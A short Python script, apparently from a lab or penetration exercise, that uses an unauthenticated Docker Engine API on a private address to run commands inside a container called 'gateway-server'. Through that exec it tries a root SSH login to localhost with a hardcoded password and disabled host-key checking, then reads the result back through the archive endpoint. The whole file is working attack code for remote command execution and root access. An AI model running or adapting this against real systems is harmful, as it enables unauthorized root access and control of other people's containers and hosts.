"""
Test ssh from inside container to 127.0.0.1 with password
"""
import urllib.request, json, time
URL = 'http://172.16.0.40:2375'

# Use sshpass if available, or expect/script
body = json.dumps({"Cmd": ["sh", "-c", "which sshpass > /tmp/p.log 2>&1; sshpass -p rootpass123 ssh -o StrictHostKeyChecking=no root@127.0.0.1 'whoami' >> /tmp/p.log 2>&1; cat /tmp/p.log"]}).encode()
req = urllib.request.Request(f'{URL}/containers/gateway-server/exec', data=body, headers={'Content-Type': 'application/json'}, method='POST')
r = urllib.request.urlopen(req)
eid = json.loads(r.read())['Id']
urllib.request.urlopen(urllib.request.Request(f'{URL}/exec/{eid}/start', data=b'{"Tty":false}', headers={'Content-Type': 'application/json'}, method='POST')).read()
time.sleep(10)
r = urllib.request.urlopen(f'{URL}/containers/gateway-server/archive?path=/tmp/p.log', timeout=10)
data = r.read()
sz = int(data[124:136].rstrip(b'\x00').rstrip(b' ').decode('utf-8'), 8) if data[124:136].rstrip(b'\x00').rstrip(b' ').decode('utf-8') else 0
print(data[512:512+sz].decode('utf-8', errors='replace'))
